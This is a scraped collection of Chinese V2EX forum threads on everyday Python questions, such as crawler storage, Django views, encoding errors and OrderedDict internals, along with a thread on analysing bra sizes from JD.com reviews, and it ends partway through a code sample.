{"content": ["<div class=\"topic_content\">还剩很多空间，但是 inode 空间已经不够了。是应该在格式化硬盘的时候就多分配一点 inode 空间呢，还是在设计爬虫的时候就不要生成太多小文件呢？\r<br>\r<br>如果是前者的话，有办法在不丢失 vps 上数据和程序的情况下改变 inode 大小么？\r<br>如果是后者的话，我爬的是 zhihu ，现在是每个回答是一个单独的文件。该怎么减少小文件的数量呢？都写在同一个文件，然后用多线程锁么？</div>"], "reply": "17", "tittle": "如何解决爬虫会生成很多小文件的问题呢？", "comment": ["每个回答放在一行，或者入库", "你听说过数据库吗？", " 听说过……觉得项目小就没有用。这种情况还是要用比较好么？", "看了一下 sqlite ，准备用它了。", " 是啊， ext 文件系统的设计不适合存放大量小文件， btrfs 也许可以。\r", "但一个文件还会有用户权限修改时间什么的很多元数据，开销很大。打开文件的时候还要占用文件描述符。\r", "你用个简单的 SQLite 数据库也比直接创建文件好。", "本来就是玩，你就尽量折腾呗，各种方法都试试，多好的提高机会啊", " 都用数据库了，干脆就 MySQL 吧。", "感觉楼上说的解决办法都对，但是没有解答这个基本问题：为什么放文件会比放数据库更占用磁盘空间？\r", "\r", "楼主可以试着解答下", " 我的错，我才发现你的问题是 inode 不够了。。", " 我觉得用 Postgres 数据库好!", "linode 可以自已格式化一个盘挂上的，格式成 ReiserFS 就可以了，那个不限 inode 数。", "leveldb 啊", "我还说爬虫怎么会自己产生小文件呢。。。", " 因为文件有最低大小←_←\r", "好像 4kb 吧我记得", "感觉可以使用个 bitcask 引擎的存储系统试试。", "以前我们的图片服务器也遇到一样的问题， inode 耗净，磁盘空间却还很多。\r", "\r", "解决方法当然是用数据库或者使用分布式文件存储方案：\r", "\r", "1 ） MogileFS 、 FastDFS 等分布式文件存储系统\r", "\r", "2 ） OSS 、七牛、又拍云等云存储方案（每月每 G 才几毛钱）", "一般入 mongodb ，如果觉得喜欢文件的话，也可以使用 mongo 的文件存储。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>有些模块是不是可以不使用基于视图类呢？</p>\n<p>比如 login 和 logout</p>\n<p>普通模式：</p>\n<pre><code>def logout_views(request):\n    logout(request)\n    return HttpResponseRedirect('/')\n</code></pre>\n<p>基于视图类：</p>\n<pre><code>class LogoutViews(RedirectView):\n    url = '/'\n\n    def get(self, request, *args, **kwargs):\n        logout(request)\n        return super(LogoutViews, self).get(request, *args, **kwargs)\n</code></pre>\n<p>类似于这个，普通模式代码量少，并且一目了然。反而基于视图类的有点。。。。</p>\n<p>基于视图类的观点不是要减少代码量然后复用吗？\n那么这种情况怎么选者呢？</p>\n<p>谢谢</p>\n</div></div>"], "reply": "4", "tittle": "关于 Django 中使用基于视图类的疑问", "comment": ["也要看具体情况的，有些时候你自己写函数的视图，写了半天发现基于类的视图改几个地方就可以了。一些代码量多，重复工作多的视图我都尽量用基于类的视图，一些简单的或者基于类的视图不能满足需求的，用函数视图。", "主要还是为了统一把。。。大部分类用视图类比较方便，你举的这个例子可能代码稍微多一点。但为了统一，还是全用视图类比较好，否则惨杂着两种写法，看起来很别扭", "我尝试过几次切换到类视图，但需求变复杂之后，类视图太难以驾驭了，每次都要查很久文档。\r", "所以现在一直坚持用函数视图，感觉这才是 Pythonic 的写法。", "class LogoutViews(View):\r", "   def get(self, request):\r", "        logout(request)\r", "        return HttpResponseRedirect('/')\r", "\r", "\r", "我一般会这样用，不用其他奇怪的 XXXView"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><code>\n<p>pip install flask\nRequirement already satisfied: flask in /Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/site-packages\nRequirement already satisfied: click&gt;=2.0 in /Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/site-packages (from flask)\nRequirement already satisfied: Jinja2&gt;=2.4 in /Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/site-packages (from flask)\nRequirement already satisfied: Werkzeug&gt;=0.7 in /Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/site-packages (from flask)\nRequirement already satisfied: itsdangerous&gt;=0.21 in /Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/site-packages (from flask)\nRequirement already satisfied: MarkupSafe in /Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/site-packages (from Jinja2&gt;=2.4-&gt;flask)\npython\nPython 2.7.10 (default, Jul 30 2016, 18:31:42)\n[GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)] on darwin\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\nfrom flask import Flask\nTraceback (most recent call last):\nFile \"&lt;stdin&gt;\", line 1, in &lt;module&gt;\nImportError: No module named flask</p>\n</code>\n上面提示已经安装了 flask 但是却无法调用。\n</div></div>"], "reply": "5", "tittle": "mac 安装完 fish shell 以前用 pip 安装的东西都不能用了", "comment": ["是不是移动或者拷贝过虚拟环境？", "我这没有建立虚拟环境。", " 我这没有建立虚拟环境。", "如果退出 fish 再调用正常吗？如果正常就看一下进入 fish 之后， Python 命令行下边的 path 是不是改变了，导致找不到 flask", "检查环境变量"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>听慕课网某讲师说很多第三方库不兼容 3 ，这就很尴尬了，我本来想着学新不学旧</p>\n<p>作为初学者，到底学 2 还是学 3 好？是想认真学的那种。谢谢</p>\n</div></div>"], "reply": "61", "tittle": "Python 到底学 2 还是学 3 好？很多第三方库不兼容 3？", "comment": ["3\r", "\r", "讲师水平不一定你比高。。。。", "3", "注意下视频发布的时间", "等真正遇到什么不得不用 2 的情形，再回去学 2 不迟（其实肯定不会遇到）", "十年前的教程了吧，现在第三方库不支持 3 的已经不多了吧", "学新不学旧\r", "\r", "为啥会出现不兼容 就是为了弥补 Python 原来的缺陷", "区别不大", "以学习为目的的就是 3", "学 3 ，现在已经有很多特性只有 3 才有而 2 没有的了，如 async/await", "你是学语言呢 还是学习库呢？？", "学 3 吧，其实差别不是很大。现在 3 的教程快比 2 多了。\r", "\r", "利益相关：一直在用 2", "先学 3 ，在兼容 2 ， 2 个都会不是什么难事，学好了 3 之后大概再花个 1~2 小时就可以兼容 2 。", "学 3  讲师的水平通常落后， 另外注意视频发布时间，没准 4 年前发布的\r", "现在 3 不兼容的库 ，基本都是一些没有人用的垃圾库", " 很强，谢谢\r", "\r", "谢谢楼上有所耐心回答的 V 友，已决定学 3", "等明年这时候可能就听说很多库不支持 2 了。", "没什么库不支持 3 了，只是有一些可能支持还不是很完善，存在一些 bug ，但一点不影响。", "果断 3", "用 2 的建议 3", "入哪一个都没问题，完全可以当两门语言来学", "初学者必须 3 ，手头有项目的能 2 就 2", "学 3 ，官方已经钦定支持 2 到 2020 年了 ", "我来改一下标题\r", "Javascript 到底学 ES5 还是学 ES6 好？很多第三方库不兼容 ES6 ？", "学 Ruby 吧，从此不再纠结 2 还是 3 （", "目前大部分你能想到的的库都支持 3", "安利一下 berkekley 的 cs61a", " +1s", "真心不重要 想认认真真学 python 不看 python 教程 看 Ruby 的都可以\r", "学精了之后转很容易", "看你要干嘛。。学 2 也没差。坑都被填完了。反正我用着玩的，一直都是 2", "3333333333", "工作中还是 2 为主。\r", "别忘了 Perl6 的笑话", "都一样啊，主要还是看你想做啥", "别逗了，学 3", "反正从上手一直都是 2 ，楼主也不要纠结", "其实别把学语言当成一场圣战, 其实入门也不过一周时间, 学深入了日常用一年基本也够了, 但是学了语言就够么, 好多初学者最大的困惑反而是在学完之后, 那个时候学完某某语言 prime 仿佛手握雷神之锤,举目四望到处找钉子, 但是往往很多人都在这个时候发现, 妈蛋的学了半天语言确还是啥也不会做, 然后发帖求助问能做啥, 然后被告知还要再学习 B, C, D, E.......等等 等等.......", " perl6 怎么了？愿闻其详", "运维学 2", "区别不大", "没有历史原因就学 3\r", "2 有些写法太 ugly 啦😋", "插楼问一下，怎么快速从 2 学会 3 ？", "自己走上邪路的一般这么鼓动别人学 3 ：基本上库都支持 3 了，好多新库只有 3\r", "工作上一旦用了 3 ：到 github 一查，经常是只支持 2 的库，或者就是没写只支持 2 ，但是在 3 下一运行，运行不起来。实际上只有一些比较知名的公共库支持 3 了， github 上大批的个人写的库都只支持 2 ，等你发现的时候项目已经用 3 了，这些库要么自己转，要么自己重新写，领导给的工期就这么多，你只能含泪加班了。这时候你要诉苦，那些当初忽悠你的人可能还会挖苦你效率这么差或眼光差，不给转 3 的库就不应该用，到时候你就有吃了狗屎的感觉，那么多库不支持，当初我转 python 干嘛呀", "自己玩，挖新坑，用 3 \r", "\r", "老司机都用 2 。。", "3 注定淘汰的，以后是 Python 2 和 Python 4 的天下", " Excuse me? 这是几年前得到的感受了？现在是 2016 年，醒醒。\r", "\r", " python4 说不折腾，那是由 3 继承的； 2 还是该不兼容不兼容。", "既然是学，肯定学 3 好。\r", "其实学 Python 如果只是学完基本语法，完成需求就满足，不更加深入， 2 和 3 有什么区别？\r", "我觉得更多精力可以放在看 pep ，还有核心开发者的邮件讨论等等上面，看看这门语言的 API 是怎样进化的，现状是如何形成的，为什么要做一个不兼容 Python2 的版本， 3 到底强在哪里，为什么 2 生命力那么顽强？\r", "这样就超越了一般 2 和 3 的泛泛讨论，会有一门语言的宏观认识，知道一门编程语言牵扯到的设计、社区、历史、同类语言等等方方面面，到时候 Python 的版本号叫什么，有什么关系？", "3 很多老库没人维护了。所以不支持 3 ，但 3 下面一般有替代用的库", "web 选 3 ，软件 选 2", "linux 发行版本默认什么就选什么", "月经贴。。\r", "自学学 3 ，因为毕竟是新版本有很多新特性\r", "但是 2 也建议学一下，以防万一", "之前写了两年 2 ，最近新开的坑转移到 3 去了，主要是 2 的 str 太烦人了。如果你不知道，随便挑一个先学就好了，只要不是整个项目都要从 2 迁移到 3 这种情况， 2->3 没有任何问题。", "讲师。。。\r", "我一同学现在是北大青鸟讲师，\r", "项目都没做几个，整天跟我说自己啥也不会，给他外包的活都不敢做。\r", "所以后来跑去当讲师了。", "看是什么工种，职业 python 开发，就 3 ，\r", "如果是职业运维就 2 ，毕竟现在服务器 centos6,7 都是 2.6,2.7 ， 2 还能再战 3-4 年。", "很靠谱的说， 3 的库数量最近已经超 2 了", "学 3 ，换到 2 ，是忍痛割爱；\r", "学 2 ，换到 3 ，是各种报错。", "真尼玛受不了了，月经贴就罢了，楼主你不会去搜搜？\r", "\r", "自学 python 应该学 2 还是 3 ？： ", "\r", "\r", "新手学习 python ，是学 python2 好，还是 python3 呢？： ", "\r", "\r", "Python2.7 还是 3.5 。纠结： ", "\r", "\r", "一个老生常谈的问题，学 python2 还是 python3 ： ", "\r", "\r", "学个 python 给你矫情的，还学 2 学 3 ，整天发些月经贴，你能学啥？？", "不兼容的话就靠同学你写出兼容的 code 了. (拍肩.", "3 ， 大部分都兼容了。", "语言来讲 2 ， 3 基础都差不多，只是运行环境及库，新的特性，有所区别。\r", "如果新手学习，当然建议从 3 学起", "3", "视频键程还是别看了 用处不大还慢", "我想问问，如果是机器学习方向呢？", " async ,awit,好像在 2 里面表示为 yield from...什么的， asyncio 的文档里有些"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>比如 V2EX ，允许用户通过 markdown 格式发帖。现在我想做的是：</p>\n<p>转义用户输入的纯 html ， js 代码。</p>\n<p>代码块中的 html ， js 代码不被转义。</p>\n<p>一些 mardown 和 html 共同的标签不被转义。</p>\n<p>仔细思考发现这是一个挺麻烦的事情，需要考虑的情况比较多。</p>\n<p>有没有完善的第三方 python 模块已经做了这个事了？</p>\n</div></div>"], "reply": "4", "tittle": "当允许用户输入 markdown 内容时，如何防止跨域脚本攻击？ Python 有没有相关的处理模块？", "comment": ["项目里面使用的 js 编辑器 editor-md", " 但这只是编辑器吧？对用户输入的内容做处理了么？", "可以在转义的时候，自定义过滤器，用过 flask Bleach ，然后根据自己的需要修改。", " 自己写过滤挺复杂的，希望能有一个现成的框架。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>报错信息：</p>\n<pre><code>Traceback (most recent call last):\n  File \"/home/wwwroot/Spider/run.py\", line 143, in &lt;module&gt;\n    Spider.run()\n  File \"/home/wwwroot/Spider/run.py\", line 53, in run\n    print u\"[!] 休眠检查时间 %s\" % CurrentTime()\nUnicodeEncodeError: 'ascii' codec can't encode characters in position 4-7: ordinal not in range(128)\n</code></pre>\n<p>在 shell 中直接运行则无报错。爬了 Google 和 stackoverflow ，尝试过在 Supervisor 配置文件中添加下列内容，无效！依旧报错</p>\n<pre><code>environment=LANG=\"en_US.utf8\", LC_ALL=\"en_US.UTF-8\", LC_LANG=\"en_US.UTF-8\"\n</code></pre>\n<p>最后 export LANG 依旧无效，代码中有有设置 #coding:utf-8 ，在 Windows 下运行正常， Linux 上 shell 运行也没问题，但是用 Supervisor 则报错。</p>\n</div></div>"], "reply": "13", "tittle": "Supervisor 执行时报 UnicodeError", "comment": ["python2 请加 magic encoding", "第一个 LANG 写错了", "明明是代码的 bug ， 通过改 locale 去修正就有点缘木求鱼了\r", "\r", "print (u\"[!] 休眠检查时间 %s\" % CurrentTime()).encode('utf-8)", "尝试设置环境变量 PYTHONIOENCODING=UTF-8", " 时间这里我转成了 str ，转的时间格式没问题。。。本地以及在 shell 执行都没问题，在 Supervisor 启动就报错了。\r", "当我把所有中文内容换成英语后在 Supervisor 上启动。。。没有问题……与代码无关", " 头已加 encoding 啦", " 还真就是代码的问题，在本地和 shell 没问题， 是因为你的 shell 的 locale 设置成了 utf-8 。\r", "但程序本身不应该依赖这种环境变量, 不然把程序移植到其他环境，或是用另一种方式启动程序, 就报错了", " thx 非常感谢，还真是这个问题 -。-", "Python2 的 print 对于字符串（ unicode ）类型需要在内部按照 Python 感知到自己应该使用的 IO 编码方式编码，才能输出到缓冲区之类的东西。如果 Python 的感觉不对，那你就该用 PYTHONIOENCODING=UTF-8 这种东西掰对。\r", "\r", " 一个语言本来打印语句可以直接打印字符串的，结果却要变成字节流打印，难道不是执行环境的 bug 吗？更别说：\r", "\r", "* 依赖环境变量？直接假定输出代码页是 UTF-8 岂不是更糟？能编码中文、运行 Python 的终端窗口用的编码又不止 UTF-8 。\r", "* 字节串 print 这件事情基本上是 Python2 没想好 Unicode 字符串和字节串区别的时候留下的黑历史， Py3 去试试 print(b'\\x2e') 就知道了。", " 你倒是说说怎么判定执行环境的 encoding ？", " 真是，怎么就不能判定了？\r", "\r", "就拿 Python 2.7 （ ", " ）举 sys.stdout 的例子：\r", "\r", "就酱。别的系统的实现也在那附近。\r", "\r", "// Python 3.x 的实现在 _Py_device_encoding() 里面， GitHub 网页上用 GetConsoleOutputCP 也能搜到。\r", "// 对于 locale 有 GetACP()。\r", "\r", "我用 cp437 开个 Python 2.7 ：\r", "C:\\Program Files (x86)\\FontForgeBuilds\\bin>ffpython.exe\r", "Python 2.7.10 (default, Jul  8 2015, 15:14:56)\r", "[GCC 5.1.0] on win32\r", "Type \"help\", \"copyright\", \"credits\" or \"license\" for more information.\r", ">>> import sys, locale, os\r", ">>> print(sys.stdout.encoding)\r", "cp437\r", ">>> print(sys.stdout.isatty())\r", "True\r", "\r", "我 chcp 936 再开一个：\r", "\r", ">>> print(sys.stdout.encoding)\r", "cp936\r", "\r", "* Python 3.6 的官方 Windows 构建 sys.stdout.encoding 都是 utf_8 了，我也懒得去看是什么鬼。", " 别人把 stdout 重定向到文件，怎么判定？重新到 less/more 怎么判定? 还是要猜。 btw, _Py_device_encoding 也是猜的， 并不能保证准确", " 所以我一直在说的“猜错了就给它掰回去”你是两层回复就忘了？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>db = pymysql.connect(\"localhost\",\"testuser\",\"test123\",\"TESTDB\" )\n\nclass User(Model): \n    username = CharField()\n\n    class Meta:\n        database = db\n</code></pre>\n<p>用这种方式报 connection 没有 compiler 这个错</p>\n</div></div>"], "reply": "3", "tittle": "请教 Python3 下 pymysql 如何连接 peewee，谢谢", "comment": ["peewee 是个 orm ， pymysql 是个 db driver ，难道不应该是 peewee 通过 pymysql 链接 mysql 吗？ ", "你的用法不对吧： ", "我比较喜欢这种方式： "]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>代码如下, 其中初始化时<code>root[:] = [root, root, None]</code> 和设置值时<code>last[1] = root[0] = self.__map[key] = [last, root, key]</code> 这边怎么理解呢？谢谢啦</p>\n<pre><code>class OrderedDict(dict):\n    'Dictionary that remembers insertion order'\n    # An inherited dict maps keys to values.\n    # The inherited dict provides __getitem__, __len__, __contains__, and get.\n    # The remaining methods are order-aware.\n    # Big-O running times for all methods are the same as regular dictionaries.\n\n    # The internal self.__map dict maps keys to links in a doubly linked list.\n    # The circular doubly linked list starts and ends with a sentinel element.\n    # The sentinel element never gets deleted (this simplifies the algorithm).\n    # Each link is stored as a list of length three:  [PREV, NEXT, KEY].\n\n    def __init__(*args, **kwds):\n        '''Initialize an ordered dictionary.  The signature is the same as\n        regular dictionaries, but keyword arguments are not recommended because\n        their insertion order is arbitrary.\n\n        '''\n        if not args:\n            raise TypeError(\"descriptor '__init__' of 'OrderedDict' object \"\n                            \"needs an argument\")\n        self = args[0]\n        args = args[1:]\n        if len(args) &gt; 1:\n            raise TypeError('expected at most 1 arguments, got %d' % len(args))\n        try:\n            self.__root\n        except AttributeError:\n            self.__root = root = []                     # sentinel node\n            root[:] = [root, root, None]\n            self.__map = {}\n        self.__update(*args, **kwds)\n\n    def __setitem__(self, key, value, dict_setitem=dict.__setitem__):\n        'od.__setitem__(i, y) &lt;==&gt; od[i]=y'\n        # Setting a new item creates a new link at the end of the linked list,\n        # and the inherited dictionary is updated with the new key/value pair.\n        if key not in self:\n            root = self.__root\n            last = root[0]\n            last[1] = root[0] = self.__map[key] = [last, root, key]\n        return dict_setitem(self, key, value)\n\n    def __delitem__(self, key, dict_delitem=dict.__delitem__):\n        'od.__delitem__(y) &lt;==&gt; del od[y]'\n        # Deleting an existing item uses self.__map to find the link which gets\n        # removed by updating the links in the predecessor and successor nodes.\n        dict_delitem(self, key)\n        link_prev, link_next, _ = self.__map.pop(key)\n        link_prev[1] = link_next                        # update link_prev[NEXT]\n        link_next[0] = link_prev                        # update link_next[PREV]\n\n    def __iter__(self):\n        'od.__iter__() &lt;==&gt; iter(od)'\n        # Traverse the linked list in order.\n        root = self.__root\n        curr = root[1]                                  # start at the first node\n        while curr is not root:\n            yield curr[2]                               # yield the curr[KEY]\n            curr = curr[1]                              # move to next node\n\n    def __reversed__(self):\n        'od.__reversed__() &lt;==&gt; reversed(od)'\n        # Traverse the linked list in reverse order.\n        root = self.__root\n        curr = root[0]                                  # start at the last node\n        while curr is not root:\n            yield curr[2]                               # yield the curr[KEY]\n            curr = curr[0]                              # move to previous node\n\n    def clear(self):\n        'od.clear() -&gt; None.  Remove all items from od.'\n        root = self.__root\n        root[:] = [root, root, None]\n        self.__map.clear()\n        dict.clear(self)\n</code></pre>\n</div></div>"], "reply": "4", "tittle": "python collections.Ordereddict 源码中, 用来记录有序的结构，怎么理解？不是能看懂为什么这样存储。", "comment": ["关键在于\r", ">     # Each link is stored as a list of length three:  [PREV, NEXT, KEY].\r", "就是说 od 的有序实际上是由一个双向链表实现的。由于 Python 里 list 是可变对象，一个节点 list 里的 PREV 和 NEXT 是对前驱和后继节点 list 的引用\r", "\r", "初始化那里， root 前驱和后继都指向自己，方便接下来实现环链。\r", "那句核心操作应该联系上文：\r", "last = root[0]\r", "last[1] = root[0] =  [last, root, key] # self.__map[key] 可以稍后再看\r", "这句话实现了在 root 前插入节点，建议楼主自己在纸上画一下。", "是个双向链表 [0] 和 [1] 理解成 .prev 和 .next 就可以了\r", "root[:] = [root, root, None] ==> root = [None, None, None]; root[0] = root; root[1] = None;", "  今天补了下双向链表和哨兵的相关知识，大体上能理解为什么能这样做了。然而还是有几点不清楚。\r", "1. 为什么要采用这种结构来保存有序性，这样做的用意是什么，为什么不采用简单的 list 来做呢？\r", "2. 这种用 list 实现双向链表的做法妥当吗？实际上，在每一个 list 的三个元素中，前两个(prev, next)保存的什么，指针？ 这样用 list 来实现双向链表会数据冗余吗?\r", "谢谢啦！ 我现在还不是能理解透彻，望指教！", " \r", "我只会从静态语言的角度解释，所以下面说的不一定是对的。\r", "1. 这个涉及到数组 (Python 里的近似就是元素都是不可变对象的 list ，就是你所说的“简单的 list ”) 和链表这两种基本数据结构的本质用途：二者同样是序列，数组按 index 存值取值，对于**固定**的序列存取都是 O(1)；双向链表按 pre 、 next 遍历，因为节点是可变对象，可以被引用 (对于 od 来说就是 self.__map[key] 的用途) ，对于**动态**的序列存取也是 O(1)。\r", "od 显然要维护一个动态序列，链表就是个很好的选择。你可能会想到 list 可以 del 某个元素，但这其实破坏了数组的规则 (Python 的 list 不是数组)， index 都被改变了，不能根据原来的 index 来存取。那元素是可变对象的 list ([[key1], [key2], ...]) 呢？这样也可以用不受 index 影响的不变引用来 O(1) 存取。但其实 list 的 del 效率是很低的，是 O(n)，因为要重新分配 index 。总之，对于动态序列，用链表就对了。\r", "\r", "2. 上面的问题纠结完了，这个问题就很好回答。双向链表的节点必须要 pre ， next ，和值这三部分，没有任何冗余。其次，引用其实不是很占空间。再说了，牺牲了空间，换来了时间。\r", "\r", "题外话：关于指针和引用，请看： "]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>第一次写文章。。。\n<a href=\"https://zhuanlan.zhihu.com/p/23790374\" rel=\"nofollow\">https://zhuanlan.zhihu.com/p/23790374</a></p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>这是原始150万评论数据：</p>\n<p>链接：<a href=\"http://pan.baidu.com/s/1kV0PBh1\" rel=\"nofollow\">http://pan.baidu.com/s/1kV0PBh1</a> 密码：guvy</p>\n</div></div>", "<div class=\"topic_content\">添加地区之后的结果：\r<br>\r<br><a target=\"_blank\" href=\"https://zhuanlan.zhihu.com/p/23812077\" rel=\"nofollow\">https://zhuanlan.zhihu.com/p/23812077</a></div>"], "reply": "70", "tittle": "京东百万记录分析中国人罩杯分布", "comment": ["有想法....", "一晚上就把评论爬好了？楼主用了代理池没有？还是京东没有做频率限制？", "厉害了我的哥，建议再做不同地区的数据，方便广大 V2 甄选。", "服。。", "有地域就更 NB 了！", "不服气不行。", "也可以这么描述： \r", "\r", "吃惊！ B 及以上罩杯 人数占到了 81%！", "这个厉害了", "小朋友事无巨细爱评论", "有意思。。。", "点子好,但分析好像有点不太靠谱", "一眼看成东京。。。", "c 是 15% d 是 5%。楼主最后一点有笔误😂", "然而我女朋友跟我说很多人内衣买的尺码都不对", "貌似女生有的 size 并没有那么大然后会买“加厚”的等等可能会影响统计？", "A 会不会不用买文胸？有没有女孩子来解读一下", "带钢丝的 BRA 完全不能真实反应实际尺寸，实际都比买的要起码小半号。", " 竟然懂这么多，你是女生吧。。不过加厚也是在 abcd 的基础上加厚吧，比如\"加厚款 B 杯\"，还是 B 呀", " 限制比较小，另外做了一点防 ban", " 是的，改过来了", " 看了一下，真的有地域数据，改天分析一下~", "果然要脑洞大啊", " 6666666666", "罩杯 感觉不代表什么 前任是 36C 感觉一个手而已", "胸部大小不应该只靠 adc 这些来判定吧， abc 这些只是用来下胸围和上胸围的差的，字母越靠后，差得越多。。。", "说明胸小的姑娘爱评论…^_^", "这个统计数据不包括年龄，实际上可能年龄偏小的确实爱评论而胸部未必发达，统计是需要一些专业性的", "身体特征(医疗健康性质)和销售性质的统计不同，不论是否“真实”（买大点？）数据，对销售还是有一定意义的", "怪不得那么多靠大胸赚钱的，果然还是物以稀为贵呀。长知识了~~", " 显然你想太多了  要是有过小胸女朋友你就懂了 哈哈哈", " A 罩杯会买文胸来撑成 B 以上……\r", "别问我怎么知道的……我不是妹子……", "不会太准", "脚大的男士穿大于 45 号鞋的，会在网上买鞋吗 ？\r", "😏", "老哥，稳。\r", "\r", "另外有地域么。。", "应该只抓自营的排除刷单的影响", "这个其实早就有人统计过了，结果嘛。。。没错，就是楼主说的那样。。。", "楼主你哪来的勇气发在知乎，很快就有中华田园女权教你做人的（程序屌丝也配谈论老娘罩杯.etc ）", " +1 我记得是淘宝官方统计的。", "其实限制了样本，首先是要在网上买的，然后是要在京东买的。\r", "150w ，如果按 id 过滤会是多少呢", " 对对对，淘宝统计过。", "D 杯也不容忽视啊。", "抛开底围谈 cup 数都是耍流氓", "标题叫中国人罩杯分布有点大 ...  数据里只能得出「爱在京东晒单的妹子普遍胸小」这个结论吧 ...\r", "\r", "所以标题不如改叫「震惊！看完这篇文章再看看你自己的胸，以后还敢去京东买东西吗？」 ...", "我觉得爬图片加上图片鉴黄能找出很多福利。", " 标题党老司机，服", "这数据应该包含了男性购买的数据吧", "同一种商品的不同品种的 id 是不一样的，但是不能获取库存和销量啊，只从列出的 size 种类来判断欠妥。如对于 A 、 B 、 C 产品有 4 个 cup size ，每个 size 卖出 1 条，而 B 产品只有 Dcup 这 1 个 size,卖出 1000 条,如果按楼主算法比例就是 2:2:2:3,但实际应该是 1 ： 1 ： 1:1001", " 没看懂。。。不同品种的 id 我做了处理了，保证同一款不同品种只抓取一次。", "看了半天还在纠结为啥东京要研究中国人的罩杯。", "厉害了，其实爬淘宝，数据更全些", "厉害了😂", "楼主是航空工程系吗？", "其实因为刷单的太多，这些数据连参考意义都没有。", "很有创意。是否有兴趣加入我们的团队？ ", "讲道理， B 杯不小了……", "做个男内裤大小分析吧", "这种不准的\r", "以前公司一 mm ，我平躺估计都比她还大\r", "也不妨碍她买 C 杯的 bar\r", "别问我咋知道的🙈", " 京东自营也刷单？", "好屌的样子", "牛,我服这脑洞..", "我服。。哈哈哈~", "服~脑洞大开~最好弄个地区", "厉害了。我的哥", "还得排除女装男性（逃", "胸只是一方面，屁股扭颈更重要", "为什么我没有找到地区数据？ ", "厉害了我的哥， 另外 建议把 淘宝 一并收了吧，这样数据更大，更准啊。。。", "有趣哈哈，台妹胸猛~", "  userProvince", "拿到代码后怎么运行呢？", "送你一帖大写的服！"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>目前基本处于一个没有前端的状态，前端的内容也是从 git 上 clone 的。</p>\n<p>花了一天研究了下 django 写了个很简单的后端，又陆陆续续花了一些时间部署的。过来呢主要是想看看别的大大的博客，最好也是 django 搭建的这样我也能学习一下。</p>\n<p>另外求一些前端的基础学习资料啊，忙完了这阵的校招之后准备好好的维护一下。</p>\n<p>博客地址是 jasonblog.top</p>\n</div></div>"], "reply": "118", "tittle": "[分享] 我也来丢一下自己的博客", "comment": [" 就是 wordpress", " \r", "\r", "顺风车晒一波。好久没更新了", "又到贴博客的时间了， ", " 只有个主页。。 ", "\r", "\r", "昨天刚重构了，还冒着热气(laugh", " 大神,膜一哈", "来一波关注  ", "\r", "\r", "Hexo 主题自己搞得..还不是很完善", "有用 flask 自己写的博客的吗？来学习一下", "[汤包桑的博客]( ", ")", "跟着老司机？ ", "也来开波车？ ", "继续顶！ blog 欢迎访问 ", "我的博客，发过一个 ", " UWP 博客", "顺风车来一波 [", " ", ")", " 请问这个网页原作者是谁呢？是开源的么？我非常喜欢想用在自己的网页上", " 原作者就是我发的地址， VUE.JS 的作者，嗯，应该不会错的（说不定他也是从哪 copy 来的.....）。\r", "\r", "楼上不是有人已经用在自己主页上了么。。。"]},
{"content": ["<div class=\"topic_content\">open(\"reader/\" + title.get_text() + \".txt\", 'w')，现在我确定 title.get_text()这个字符串中有个冒号(：)，这导致我在保存文件的时候文件名只有冒号(：)前面的内容，冒号后的包括.txt 都没有了，请问这是怎么回事</div>"], "reply": "9", "tittle": "请教 python 个 io 的问题", "comment": ["我已经尝试着百度，谷歌了，都没有找到这个问题呢，只能来像 V 友提问了", " 文件名里怎么能有冒号，你重命名一个带冒号的文件名看看", "如果是 Win 的话是不能有冒号的……过滤一下就好。\r", "\r", "参见： ", " 测试了一下，在 Windows 下你可以使用中文冒号命名，用 Python 读取保存没有问题，但建议还是不用。", " window 下是可以使用中文的冒号的", " 嗯，感谢。但是我是在写爬虫呢？小说和章节名是有中文的冒号，我尝试过滤一下吧", "在 windows 下“:”代表 ADS ，：前面的是文件流前缀，不同的前缀含义不一样（ ", " ），可以尝试转义成 URL 编码\r", "这不是 python 的问题，是文件系统的问题。\r", "我遇到这种问题都是绕开，懒得深究，没有太大的意义。", "文件名不能包含以下任意字符\r", "\\ 、/ 、: 、* 、?、 \"、 <、>、| \r", "这是系统的问题，最简单的做法是转成全角的。\r", "\r", "str1.replace('/','／') .replace('\\\\','＼').replace('\"',\"'\").replace(\":\",\"：\")\r", "\r", "或者用其他的替换，比如 1*2-->1x2 。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>python3.5.2 win7 32 位系统，直接运行可以，编译成 exe 报这错误</p>\n<pre><code>    ---------------------------\n    Traceback (most recent call last):\n      File \"C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python35-32\\lib\\site-packages\\cx_Freeze\\initscripts\\__startup__.py\", line 12, in &lt;module&gt;\n      File \"C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python35-32\\lib\\site-packages\\cx_Freeze\\initscripts\\Console.py\", line 21, in &lt;module&gt;\n      File \"D:\\test\\sysTRyIco3.py\", line 6, in &lt;module&gt;\n      File \"C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python35-32\\lib\\site-packages\\win32\\lib\\win32gui_struct.py\", line 36, in &lt;module&gt;\n    ImportError: No module named 'pywintypes'\n</code></pre>\n<p>源代码如下：</p>\n<pre><code># _*_ coding: utf-8 _*_\nimport os\nimport sys\nimport win32api\nimport win32con\nimport win32gui_struct\ntry:\n    import winxpgui as win32gui\nexcept ImportError:\n    import win32gui\n\nclass SysTrayIcon(object):\n    '''TODO'''\n    QUIT = 'QUIT'\n    SPECIAL_ACTIONS = [QUIT]\n    